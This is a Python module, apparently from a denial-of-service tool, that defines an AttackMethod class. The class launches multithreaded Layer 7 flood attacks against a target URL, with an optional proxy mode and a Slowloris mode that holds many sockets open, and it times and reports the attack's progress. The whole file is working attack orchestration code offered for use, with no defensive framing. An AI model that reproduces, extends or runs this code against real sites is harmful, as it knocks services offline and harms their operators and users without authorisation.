"""This module provides a class to instantiate DoS attacks."""

from __future__ import annotations

import socket
import sys
from threading import Thread
from time import sleep, time
from typing import Any, List, Union

from colorama import Fore  # type: ignore[import]
from humanfriendly import Spinner, format_timespan  # type: ignore[import]

from tools.ip_tools import create_socket, get_target_address  # type: ignore[import]


def get_method_by_name(method: str) -> Any:
    """Get the flood function based on the attack method.

    Args:
        - method - The method's name

    Returns:
        - flood_function - The associated flood function
    """
    dir = f"tools.L7.{method.lower()}"
    module = __import__(dir, fromlist=["object"])
    flood_function = getattr(module, "flood")
    return flood_function


class AttackMethod:
    """Control the attack's inner operations."""

    def __init__(
        self,
        method_name: str,
        duration: int,
        threads: int,
        target: str,
        use_proxy: bool,
        sleep_time: int = 15,
    ):
        """Initialize the attack object.

        Args:
            - method_name -- The name of the DoS method used to attack
            - duration - The duration of the attack, in seconds
            - threads - The number of threads that will attack the target
            - target - The target's URL
            - use_proxy - Whether or not to use proxies
            - sleep_time - The sleeping time of the sockets (Slowloris only)
        """
        self.method_name = method_name
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.use_proxy = use_proxy
        self.sleep_time = sleep_time
        self.threads = list()  # type: List[Thread]
        self.sockets = list()  # type: List[socket.SocketType]
        self.is_running = False

    def __enter__(self) -> AttackMethod:
        """Set flood function and target's URL formatted attributes."""
        self.method = get_method_by_name(self.method_name)
        self.target = get_target_address(self.target)
        return self

    def __exit__(self, exc_type, exc_value, traceback) -> None:  # type: ignore
        """Do nothing, only for context manager."""
        pass

    def __run_timer(self) -> None:
        """Verify the execution time every second."""
        __stopTime = time() + self.duration
        while time() < __stopTime:
            sleep(1)
        self.is_running = False

    def __run_flood(self, sock: Union[socket.SocketType, None] = None) -> None:
        """Start the flooder."""
        while self.is_running:
            if sock:
                self.method(sock)
                sleep(self.sleep_time)
            else:
                self.method(self.target, self.use_proxy)

    def __run_threads(self) -> None:
        """Initialize the threads."""
        timing = Thread(target=self.__run_timer)
        timing.start()

        if self.method_name.lower() == "slowloris":
            self.sockets = [
                create_socket(self.target) for _ in range(self.threads_count)
            ]
            self.threads = [
                Thread(target=self.__run_flood, args=(self.sockets[i],))
                for i in range(self.threads_count)
            ]
        else:
            self.threads = [
                Thread(target=self.__run_flood) for _ in range(self.threads_count)
            ]

        with Spinner(
            label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))

        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}"
            )

        print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")

    def start(self) -> None:
        """Start the DoS attack itself."""
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attacking {target} using {self.method_name} method.{Fore.RESET}"
            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.\n\n{Fore.RESET}"
        )

        self.is_running = True

        try:
            self.__run_threads()

        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"{Fore.RED}\n\n[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads...\n\n{Fore.RESET}"
            )

            for thread in self.threads:
                if thread.is_alive():
                    thread.join()

            print(
                f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Interrupted!\n\n{Fore.RESET}"
            )
            sys.exit(1)
